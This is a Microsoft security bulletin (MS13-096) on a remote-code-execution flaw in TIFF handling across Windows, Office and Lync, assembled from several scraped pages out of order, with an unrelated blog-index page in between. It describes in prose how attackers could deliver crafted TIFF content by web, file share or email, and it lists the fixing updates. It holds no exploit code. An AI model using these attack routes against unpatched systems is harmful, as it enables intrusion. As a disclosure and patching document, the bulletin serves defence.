  1. Open the Lync Control Panel. For details about the different methods you can use to start Lync Server Control Panel, see [Open Lync Server Administrative Tools](https://technet.microsoft.com/library/gg195741.aspx).
  2. In the left navigation bar, click **Conferencing** and then click **Conferencing Policy**.
  3. In the list of conferencing policies, click **Data collaboration**, click **Edit**, and then click **Show details**.
  4. To enable data collaboration, in **Edit Conferencing Policy**, click **Enable data collaboration**.
  5. Click **Commit**.

#### FAQ

**What is the scope of the vulnerability?**

This is a remote code execution vulnerability.

**What causes the vulnerability?**

The vulnerability is caused when Microsoft Windows, Microsoft Office, or Microsoft Lync fails to properly handle specially crafted TIFF files. System memory may be corrupted in such a way that an attacker could execute arbitrary code.

**What is GDI+?**

GDI+ is a graphics device interface that provides two-dimensional vector graphics, imaging, and typography to applications and programmers.

**What is a TIFF file?**

A TIFF (tagged image file format) file allows information to be embedded in the image file, such as the compression scheme, color mode, and size.

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could cause arbitrary code to run with the privileges of the user who opens a specially crafted file or browses a website that contains specially crafted content. If the user is logged on with administrative user rights, an attacker who successfully exploited this vulnerability could take complete control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

**How could an attacker exploit the vulnerability?**

There are multiple means that could allow an attacker to exploit this vulnerability.

In a web-based attack scenario, an attacker could host a specially crafted website that is designed to exploit this vulnerability and then convince a user to view the website. An attacker would have no way to force users to view the attacker-controlled content. Instead, an attacker would have to convince users to take action, typically by getting them to click a link in an email message or in an Instant Messenger message that takes users to the attacker's website, or by opening an attachment sent through email.

In a file sharing attack scenario, an attacker could provide a specially crafted document file that is designed to exploit this vulnerability, and then convince a user to open the document file.

In an email attack scenario, an attacker could exploit the vulnerability by sending specially crafted Office data in the contents of an email message. The vulnerability could be exploited when a user opens or previews the specially crafted email message in Outlook while using Microsoft Word as the email reader. Note that by default, Microsoft Word is not the email reader in Outlook 2003. An attacker could also exploit the vulnerability by sending a specially crafted Office file to the user, and then convincing the user to open the file with an affected version of Microsoft Office software.

In a local attack scenario, an attacker could also exploit this vulnerability by running a specially crafted application to take complete control over the affected system. However, the attacker must have valid logon credentials and be able to log on locally to exploit this vulnerability in this scenario.

**What systems are primarily at risk from the vulnerability?**

Workstations and terminal servers running affected software are primarily at risk.

**Does EMET help mitigate attacks that could attempt to exploit this vulnerability?**

Yes. The Enhanced Mitigation Experience Toolkit (EMET) enables users to manage security mitigation technologies that help make it more difficult for attackers to exploit vulnerabilities in a given piece of software. EMET helps to mitigate this vulnerability in affected software on systems where EMET is installed and configured to work with the affected software.

For more information about EMET, see [The Enhanced Mitigation Experience Toolkit](https://technet.microsoft.com/security/jj653751).

**What does the update do?**

The update addresses the vulnerability by correcting the way the affected software handles TIFF files.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

Yes. This vulnerability has been publicly disclosed. It has been assigned Common Vulnerability and Exposure number [CVE-2013-3906](https://www.cve.org/CVERecord?id=CVE-2013-3906). This vulnerability was first described in [Microsoft Security Advisory 2896666](https://technet.microsoft.com/security/advisory/2896666).

**When this security bulletin was issued, had Microsoft received any reports that this vulnerability was being exploited?**

Yes. Microsoft is aware of targeted attacks that attempt to exploit this vulnerability in Microsoft Office products.

### Update Information

## Detection and Deployment Tools and Guidance

Several resources are available to help administrators deploy security updates.

* Microsoft Baseline Security Analyzer (MBSA) lets administrators scan local and remote systems for missing security updates and common security misconfigurations.
* Windows Server Update Services (WSUS), Systems Management Server (SMS), and System Center Configuration Manager help administrators distribute security updates.
* The Update Compatibility Evaluator components included with Application Compatibility Toolkit aid in streamlining the testing and validation of Windows updates against installed applications.

For information about these and other tools that are available, see [Security Tools for IT Pros](https://technet.microsoft.com/security/cc297183).

## Security Update Deployment

**Affected Software**

For information about the specific security update for your affected software, click the appropriate link:

#### Windows Vista (all editions)

**Reference Table**

The following table contains the security update information for this software.

| **Security update file names** | For all supported 32-bit editions of Windows Vista:\ **Windows6.0-KB2901674-x86.msu** |
| --- | --- |
| For all supported x64-based editions of Windows Vista:\ **Windows6.0-KB2901674-x64.msu** |  |
| **Installation switches** | See [Microsoft Knowledge Base Article 934307](https://support.microsoft.com/kb/934307) |
| **Restart requirement** | Yes, you must restart your system after you apply this security update. |
| **Removal** **information** | WUSA.exe does not support uninstall of updates. To uninstall an update installed by WUSA, click **Control Panel**, and then click **Security**. Under Windows Update, click **View installed updates** and select from the list of updates. |
| **File** **information** | See [Microsoft Knowledge Base Article 2901674](https://support.microsoft.com/kb/2901674) |
| **Registry** **key** **verification** | **Note** A registry key does not exist to validate the presence of this update. |

#### Windows Server 2008 (all editions)

**Reference Table**

The following table contains the security update information for this software.

| **Security update file names** | For all supported 32-bit editions of Windows Server 2008:\ **Windows6.0-KB2901674-x86.msu** |
| --- | --- |
| For all supported x64-based editions of Windows Server 2008:\ **Windows6.0-KB2901674-x64.msu** |  |
| For all supported Itanium-based editions of Windows Server 2008:\ **Windows6.0-KB2901674-ia64.msu** |  |
| **Installation switches** | See [Microsoft Knowledge Base Article 934307](https://support.microsoft.com/kb/934307) |
| **Restart requirement** | Yes, you must restart your system after you apply this security update. |
| **Removal** **information** | WUSA.exe does not support uninstall of updates. To uninstall an update installed by WUSA, click **Control Panel**, and then click **Security**. Under Windows Update, click **View installed updates** and select from the list of updates. |
| **File information** | See [Microsoft Knowledge Base Article 2901674](https://support.microsoft.com/kb/2901674) |
| **Registry** **key** **verification** | **Note** A registry key does not exist to validate the presence of this update. |

#### Microsoft Office 2003 (all editions)

**Reference Table**

The following table contains the security update information for this software.

| **Security update file name** | For Office 2003 Service Pack 3:**office2003-kb2850047-fullfile-enu.exe** |
| --- | --- |
| **Installation switches** | See [Microsoft Knowledge Base Article 197147](https://support.microsoft.com/kb/197147) |
| **Restart requirement** | In some cases, this update does not require a restart. If the required files are being used, this update will require a restart. If this behavior occurs, a message appears that advises you to restart.\ \ To help reduce the chance that a restart will be required, stop all affected services and close all applications that may use the affected files prior to installing the security update. For more information about the reasons why you may be prompted to restart, see [Microsoft Knowledge Base Article 887012](https://support.microsoft.com/kb/887012). |
| **Removal information** | Use **Add or Remove Programs** item in Control Panel.\ \ **Note** When you remove this update, you may be prompted to insert the Microsoft Office 2003 CD in the CD drive. Additionally, you may not have the option to uninstall the update from the Add or Remove Programs item in Control Panel. There are several possible causes for this issue. For more information about the removal, see [Microsoft Knowledge Base Article 903771](https://support.microsoft.com/kb/903771). |
| **File information** | See [Microsoft Knowledge Base Article 2850047](https://support.microsoft.com/kb/2850047) |
| **Registry key verification** | Not applicable |

#### Microsoft Office 2007 (all editions)

**Reference Table**

The following table contains the security update information for this software.

| **Security update file name** | For all supported editions of Microsoft Office 2007:\ **ogl2007-kb2817641-fullfile-x86-glb.exe** |
| --- | --- |
| **Installation switches** | See [Microsoft Knowledge Base Article 912203](https://support.microsoft.com/kb/912203) |
| **Restart requirement** | In some cases, this update does not require a restart. If the required files are being used, this update will require a restart. If this behavior occurs, a message appears that advises you to restart.\ \ To help reduce the chance that a restart will be required, stop all affected services and close all applications that may use the affected files prior to installing the security update. For more information about the reasons why you may be prompted to restart, see [Microsoft Knowledge Base Article 887012](https://support.microsoft.com/kb/887012). |
| **Removal information** | Use **Add or Remove Programs** item in Control Panel. |
| **File information** | See [Microsoft Knowledge Base Article 2817641](https://support.microsoft.com/kb/2817641) |
| **Registry key verification** | Not applicable |

#### Microsoft Office 2010 (all editions)

**Reference Table**

The following table contains the security update information for this software.

| **Security update file name** | For all supported editions of Microsoft Office 2010 (32-bit editions):\ **ogl2010-kb2817670-fullfile-x86-glb.exe** |
| --- | --- |
| For all supported editions of Microsoft Office 2010 (64-bit editions):\ **ogl2010-kb2817670-fullfile-x64-glb.exe** |  |
| **Installation switches** | See [Microsoft Knowledge Base Article 912203](https://support.microsoft.com/kb/912203) |
| **Restart requirement** | In some cases, this update does not require a restart. If the required files are being used, this update will require a restart. If this behavior occurs, a message appears that advises you to restart.\ \ To help reduce the chance that a restart will be required, stop all affected services and close all applications that may use the affected files prior to installing the security update. For more information about the reasons why you may be prompted to restart, see [Microsoft Knowledge Base Article 887012](https://support.microsoft.com/kb/887012). |
| **Removal information** | Use **Add or Remove Programs** item in Control Panel. |
| **File information** | See [Microsoft Knowledge Base Article 2817670](https://support.microsoft.com/kb/2817670) |
| **Registry key verification** | Not applicable |

#### Microsoft Lync 2010, Microsoft Lync 2010 Attendee, Microsoft Lync 2013, and Microsoft Lync Basic 2013

**Reference Table**

The following table contains the security update information for this software.

| **Security update file name** | For Microsoft Lync 2010 (32-bit) (2899397):\ **lync.msp** |
| --- | --- |
|  | For Microsoft Lync 2010 (64-bit) (2899397):\ **lync.msp** |
| For Microsoft Lync 2010 Attendee (user level install) (2899393):\ **AttendeeUser.msp** |  |
| For Microsoft Lync 2010 Attendee (admin level install) (2899395):\ **AttendeeAdmin.msp** |  |
| For Microsoft Lync 2013 (32-bit) and Microsoft Lync Basic 2013 (32-bit):\ **lyncloc2013-kb2850057-fullfile-x86-glb.exe** |  |
| For Microsoft Lync 2013 (64-bit) and Microsoft Lync Basic 2013 (64-bit):\ **lyncloc2013-kb2850057-fullfile-x64-glb.exe** |  |
| **Installation switches** | See [Microsoft Knowledge Base Article 912203](https://support.microsoft.com/kb/912203) |
| **Restart requirement** | In some cases, this update does not require a restart. If the required files are being used, this update will require a restart. If this behavior occurs, a message appears that advises you to restart.\ \ To help reduce the chance that a restart will be required, stop all affected services and close all applications that may use the affected files prior to installing the security update. For more information about the reasons why you may be prompted to restart, see [Microsoft Knowledge Base Article 887012](https://support.microsoft.com/kb/887012). |
| **Removal** **Information** | Use **Add or Remove Programs** item in Control Panel. |
| **File Information** | For all supported editions of Microsoft Lync 2010:\ See [Microsoft Knowledge Base Article 2899397](https://support.microsoft.com/kb/2899397) |
| For Microsoft Lync 2010 Attendee (user level install):\ See [Microsoft Knowledge Base Article 2899393](https://support.microsoft.com/kb/2899393) |  |
| For Microsoft Lync 2010 Attendee (admin level install):\ See [Microsoft Knowledge Base Article 2899395](https://support.microsoft.com/kb/2899395) |  |
| For all supported editions of Microsoft Lync 2013:\ See [Microsoft Knowledge Base Article 2850057](https://support.microsoft.com/kb/2850057) |  |
| **Registry Key Verification** | For Microsoft Lync 2010 (32-bit):\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components{0EEB34F6-991D-4a1b-8EEB-772DA0EADB22}\ Version = **7577.4415** |
| For Microsoft Lync 2010 (64-bit):\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components{0EEB34F6-991D-4a1b-8EEB-772DA0EADB22}\ Version = **7577.4415** |  |
| For Microsoft Lync 2010 Attendee (admin level install):\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\94E53390F8C13794999249B19E6CFE33\InstallProperties\DisplayVersion = **4.0.7577.4415** |  |
| For Microsoft Lync 2010 Attendee (user level install):\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components{0EEB34F6-991D-4a1b-8EEB-772DA0EADB22}\ Version = **7577.4415** |  |
| For Microsoft Lync 2013 (32-bit) and Microsoft Lync Basic 2013 (32-bit):\ Not applicable |  |
| For Microsoft Lync 2013 (64-bit) and Microsoft Lync Basic 2013 (64-bit):\ Not applicable |  |

### Other Information

#### Acknowledgments

Microsoft [thanks](https://go.microsoft.com/fwlink/?linkid=21127) the following for working with us to help protect customers:

* Haifei Li of McAfee Labs IPS Team for reporting the Microsoft Graphics Component Memory Corruption Vulnerability (CVE-2013-3906)

#### Microsoft Active Protections Program (MAPP)

To improve security protections for customers, Microsoft provides vulnerability information to major security software providers in advance of each monthly security update release. Security software providers can then use this vulnerability information to provide updated protections to customers via their security software or devices, such as antivirus, network-based intrusion detection systems, or host-based intrusion prevention systems. To determine whether active protections are available from security software providers, please go to the active protections websites provided by program partners, listed in [Microsoft Active Protections Program (MAPP) Partners](https://go.microsoft.com/fwlink/?linkid=215201).

#### Support

**How to obtain help and support for this security update**

* Help installing updates: [Support for Microsoft Update](https://support.microsoft.com/ph/6527)
* Security solutions for IT professionals: [TechNet Security Troubleshooting and Support](https://technet.microsoft.com/security/bb980617.aspx)
* Help protect your computer that is running Windows from viruses and malware: [Virus Solution and Security Center](https://support.microsoft.com/contactus/cu_sc_virsec_master)
* Local support according to your country: [International Support](https://support.microsoft.com/common/international.aspx)

#### Disclaimer

The information provided in the Microsoft Knowledge Base is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

#### Revisions

* V1.0 (December 10, 2013): Bulletin published.
* V1.1 (December 10, 2013): Clarified that users should undo the **Disable the TIFF Codec** workaround and the **Disable data collaboration in Lync** workaround after applying the update. See the Update FAQ for more information. Added undo steps to the Disable data collaboration in Lync workaround. These are informational changes only.
* V1.2 (December 20, 2013): Revised the **Based on the configuration of my system, how do I know if my system is affected?** Update FAQ to include the updates that are applicable for each configuration. This is an informational change only.

*Built at 2014-04-18T13:49:36Z-07:00*

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025



=== Content from blogs.technet.com_0c90d506_20250125_124238.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

# Archived MSDN and TechNet Blogs

* Article
* 8/28/2023
## In this article

**If you were looking for MSDN or TechNet blogs, please know that MSDN and TechNet blog sites have been retired, and blog content has been migrated and archived here**.

## How to use this site

Archived blogs are grouped alphabetically by the initial letter of the blog name. Select the initial letter from the TOC to see the full list of the blogs.

You can also type the name of the blog or the title of the blog post in the "search" box at the upper-right corner of this page to search for it.

If you have any questions or issues, please share your feedback [here](https://github.com/MicrosoftDocs/feedback/issues).

## All Blogs

### [A](page/a/)

### [B](page/b/)

### [C](page/c/)

### [D](page/d/)

### [E](page/e/)

### [F](page/f/)

### [G](page/g/)

### [H](page/h/)

### [I](page/i/)

### [J](page/j/)

### [K](page/k/)

### [L](page/l/)

### [M](page/m/)

### [N](page/n/)

### [O](page/o/)

### [P](page/p/)

### [Q](page/q/)

### [R](page/r/)

### [S](page/s/)

### [T](page/t/)

### [U](page/u/)

### [V](page/v/)

### [W](page/w/)

### [X](page/x/)

### [Y](page/y/)

### [Z](page/z/)

### [0-9, Non-Alphabet Characters](page/0-9-non-alphabetic/)

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025



=== Content from go.microsoft.com_886df0bb_20250126_083732.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan
[Edit](https://github.com/MicrosoftDocs/security-updates/blob/live/security-updates/SecurityBulletins/2013/ms13-096.md "Edit This Document")

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

* Article
* 03/01/2023
* 6 contributors

Feedback

## In this article

Security Bulletin

# Microsoft Security Bulletin MS13-096 - Critical

## Vulnerability in Microsoft Graphics Component Could Allow Remote Code Execution (2908005)

Published: December 10, 2013 | Updated: December 20, 2013

**Version:** 1.2

### General Information

#### Executive Summary

This security update resolves a publicly disclosed vulnerability in Microsoft Windows, Microsoft Office, and Microsoft Lync. The vulnerability could allow remote code execution if a user views content that contains specially crafted TIFF files.

This security update is rated Critical for all supported editions of Windows Vista, Windows Server 2008, Microsoft Office 2003, Microsoft Office 2007, Microsoft Office 2010, Microsoft Office Compatibility Pack, and Microsoft Office viewers. It is rated Important for all supported editions of Microsoft Lync 2010 and Microsoft Lync 2013. For more information, see the subsection, **Affected and Non-Affected Software**, in this section.

The security update addresses the vulnerability by correcting the way the affected software handles TIFF files. For more information about the vulnerability, see the Frequently Asked Questions (FAQ) subsection for the specific vulnerability entry under the next section, **Vulnerability Information**.

This security update addresses the vulnerability first described in [Microsoft Security Advisory 2896666](https://technet.microsoft.com/security/advisory/2896666).

**Recommendation.** Most customers have automatic updating enabled and will not need to take any action because this security update will be downloaded and installed automatically. Customers who have not enabled automatic updating need to check for updates and install this update manually. For information about specific configuration options in automatic updating, see [Microsoft Knowledge Base Article 294871](https://support.microsoft.com/kb/294871).

For administrators and enterprise installations, or end users who want to install this security update manually, Microsoft recommends that customers apply the update immediately using update management software, or by checking for updates using the [Microsoft Update](https://go.microsoft.com/fwlink/?linkid=40747) service.

See also the section, **Detection and Deployment Tools and Guidance**, later in this bulletin.

#### Knowledge Base Article

| Knowledge Base Article | [2908005](https://support.microsoft.com/kb/2908005) |
| --- | --- |
| File information | Yes |
| SHA1/SHA2 hashes | Yes |
| Known issues | None |

#### Affected and Non-Affected Software

The following software has been tested to determine which versions or editions are affected. Other versions or editions are either past their support life cycle or are not affected. To determine the support life cycle for your software version or edition, see [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742).

**Affected Software**

| Operating System | Maximum Security Impact | Aggregate Severity Rating | Updates Replaced |
| --- | --- | --- | --- |
| Windows Vista |  |  |  |
| [Windows Vista Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=fd0f3c4d-a741-44ef-b566-29ed95ae9228) (2901674) | Remote Code Execution | Critical | None |
| [Windows Vista x64 Edition Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=420c49f6-65aa-41b5-9f34-1f0384f6c394) (2901674) | Remote Code Execution | Critical | None |
| Windows Server 2008 |  |  |  |
| [Windows Server 2008 for 32-bit Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=4d1beef2-ef8e-4cc6-a30b-e5e87f996d4d) (2901674) | Remote Code Execution | Critical | None |
| [Windows Server 2008 for x64-based Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=797e74b7-bc2b-4ea5-9629-0e56b9590087) (2901674) | Remote Code Execution | Critical | None |
| [Windows Server 2008 for Itanium-based Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=64931aa3-9aea-42af-af12-81bd3055e2da) (2901674) | Remote Code Execution | Critical | None |
| Server Core installation option |  |  |  |
| [Windows Server 2008 for 32-bit Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=4d1beef2-ef8e-4cc6-a30b-e5e87f996d4d) (Server Core installation) (2901674) | Remote Code Execution | Critical | None |
| [Windows Server 2008 for x64-based Systems Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=797e74b7-bc2b-4ea5-9629-0e56b9590087) (Server Core installation) (2901674) | Remote Code Execution | Critical | None |

**Microsoft Office**

| Office Software | Maximum Security Impact | Aggregate Severity Rating | Updates Replaced |
| --- | --- | --- | --- |
| Microsoft Office 2003 |  |  |  |
| [Microsoft Office 2003 Service Pack 3](https://www.microsoft.com/download/details.aspx?familyid=bfc3b881-4b95-4a22-998d-048487406d4f) (2850047) | Remote Code Execution | Critical | 2817480 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| Microsoft Office 2007 |  |  |  |
| [Microsoft Office 2007 Service Pack 3](https://www.microsoft.com/download/details.aspx?familyid=3d373aba-eec3-4b76-ae95-9270a82e2e7e)[1](2817641) | Remote Code Execution | Critical | 2687309 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| Microsoft Office 2010 |  |  |  |
| [Microsoft Office 2010 Service Pack 1 (32-bit editions)](https://www.microsoft.com/download/details.aspx?familyid=082ac73e-fcc9-46ac-b888-5c248a64a117) (2817670) | Remote Code Execution | Critical | 2687276 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Office 2010 Service Pack 2 (32-bit editions)](https://www.microsoft.com/download/details.aspx?familyid=082ac73e-fcc9-46ac-b888-5c248a64a117) (2817670) | Remote Code Execution | Critical | 2687276 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Office 2010 Service Pack 1 (64-bit editions)](https://www.microsoft.com/download/details.aspx?familyid=212b55fd-5fb6-42e2-8eca-5bf2b5429963) (2817670) | Remote Code Execution | Critical | 2687276 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Office 2010 Service Pack 2 (64-bit editions)](https://www.microsoft.com/download/details.aspx?familyid=212b55fd-5fb6-42e2-8eca-5bf2b5429963) (2817670) | Remote Code Execution | Critical | 2687276 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| Other Office Software |  |  |  |
| [Microsoft Office Compatibility Pack Service Pack 3](https://www.microsoft.com/download/details.aspx?familyid=3d373aba-eec3-4b76-ae95-9270a82e2e7e)[1](2817641) | Remote Code Execution | Critical | 2687309 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Word Viewer](https://www.microsoft.com/download/details.aspx?familyid=bfc3b881-4b95-4a22-998d-048487406d4f)[1](2850047) | Remote Code Execution | Critical | 2817480 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Excel Viewer](https://www.microsoft.com/download/details.aspx?familyid=3d373aba-eec3-4b76-ae95-9270a82e2e7e)[1](2817641) | Remote Code Execution | Critical | 2687309 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft PowerPoint 2010 Viewer Service Pack 1](https://www.microsoft.com/download/details.aspx?familyid=082ac73e-fcc9-46ac-b888-5c248a64a117)[1](2817670) | Remote Code Execution | Critical | 2687276 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft PowerPoint 2010 Viewer Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=082ac73e-fcc9-46ac-b888-5c248a64a117)[1](2817670) | Remote Code Execution | Critical | 2687276 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |

[1]The update for Microsoft Office 2003 also applies to Microsoft Word Viewer. The update for Microsoft Office 2007 also applies to Microsoft Office Compatibility Pack and to Microsoft Excel Viewer. The update for Microsoft Office 2010 also applies to Microsoft PowerPoint 2010 Viewer.

**Microsoft Communications Platforms and Software**

| Software | Maximum Security Impact | Aggregate Severity Rating | Updates Replaced |
| --- | --- | --- | --- |
| Microsoft Lync 2010 |  |  |  |
| [Microsoft Lync 2010](https://www.microsoft.com/download/details.aspx?familyid=3059df02-78c3-4d9c-bd9b-c3882b19bfb0) (32-bit) (2899397) | Remote Code Execution | Important | 2843160 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Lync 2010](https://www.microsoft.com/download/details.aspx?familyid=03f29527-50be-4435-adfc-279a245f3a4a) (64-bit) (2899397) | Remote Code Execution | Important | 2843160 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Lync 2010 Attendee](https://www.microsoft.com/download/details.aspx?familyid=946a1af1-d30b-4d77-a847-5f3538027db1)[1](user level install) (2899393) | Remote Code Execution | Important | 2843162 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Lync 2010 Attendee](https://www.microsoft.com/download/details.aspx?familyid=734d08ee-135e-4f11-9b77-0c75b0687e3e) (admin level install) (2899395) | Remote Code Execution | Important | 2843163 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| Microsoft Lync 2013 |  |  |  |
| [Microsoft Lync 2013](https://www.microsoft.com/download/details.aspx?familyid=6e134ef0-8ce5-421e-a4b5-b37ad8160eab) (32-bit) (2850057) | Remote Code Execution | Important | 2817465 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Lync Basic 2013](https://www.microsoft.com/download/details.aspx?familyid=6e134ef0-8ce5-421e-a4b5-b37ad8160eab) (32-bit) (2850057) | Remote Code Execution | Important | 2817465 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Lync 2013](https://www.microsoft.com/download/details.aspx?familyid=fc8667cd-cc80-4014-8981-8cb86f04d2f3) (64-bit) (2850057) | Remote Code Execution | Important | 2817465 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |
| [Microsoft Lync Basic 2013](https://www.microsoft.com/download/details.aspx?familyid=fc8667cd-cc80-4014-8981-8cb86f04d2f3) (64-bit) (2850057) | Remote Code Execution | Important | 2817465 in [MS13-054](https://go.microsoft.com/fwlink/?linkid=301531) |

[1]This update is available from the Microsoft Download Center only. See the **Update FAQ** section for more information.

**Non-Affected Software**

| Operating System |
| --- |
| Windows XP Service Pack 3[1] |
| Windows XP Professional x64 Edition Service Pack 2[1] |
| Windows Server 2003 Service Pack 2[1] |
| Windows Server 2003 x64 Edition Service Pack 2[1] |
| Windows Server 2003 for Itanium-based Systems Service Pack 2[1] |
| Windows 7 for 32-bit Systems Service Pack 1[1] |
| Windows 7 for x64-based Systems Service Pack 1[1] |
| Windows Server 2008 R2 for x64-based Systems Service Pack 1[1] |
| Windows Server 2008 R2 for Itanium-based Systems Service Pack 1[1] |
| Windows 8 for 32-bit Systems[1] |
| Windows 8 for x64-based Systems[1] |
| Windows 8.1 for 32-bit Systems[1] |
| Windows 8.1 for x64-based Systems[1] |
| Windows RT[1] |
| Windows RT 8.1[1] |
| Windows Server 2012[1] |
| Windows Server 2012 R2[1] |
| Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)[1] |
| Windows Server 2012 (Server Core installation)[1] |
| Windows Server 2012 R2 (Server Core installation)[1] |
| Microsoft Office Suites and Software |
| Microsoft Office 2013 (32-bit editions) |
| Microsoft Office 2013 (64-bit editions) |
| Microsoft Office 2013 RT |
| Microsoft Communication Platforms and Software |
| Microsoft Speech Server 2004 |
| Microsoft Speech Server 2004 R2 |
| Microsoft Live Meeting 2007 Console |
| Microsoft Live Communications Server 2003 |
| Microsoft Live Communications Server 2005 Service Pack 1 |
| Microsoft Communicator 2005 |
| Microsoft Communicator 2005 Web Access |
| Microsoft Communicator 2007 |
| Microsoft Communicator 2007 R2 |
| Microsoft Communicator 2007 Web Access |
| Microsoft Communications Server 2007 |
| Microsoft Communications Server 2007 Speech Server |
| Microsoft Communications Server 2007 R2 |
| Microsoft Communicator 2007 R2 Attendant |
| Microsoft Communicator 2007 R2 Group Chat Admin |
| Microsoft Communicator 2007 R2 Group Chat Client |
| Microsoft Communicator for Mac 2011 |
| Microsoft Lync for Mac 2011 |
| Microsoft Lync 2010 Attendant (32-bit) |
| Microsoft Lync 2010 Attendant (64-bit) |
| Microsoft Lync Server 2010 |
| Microsoft Lync Server 2013 |
| Microsoft Lync Web Access 2013 |

[1]These editions of Microsoft Windows are not affected if you do not have an affected version of Microsoft Office or Microsoft Lync installed on the platform.

## Update FAQ

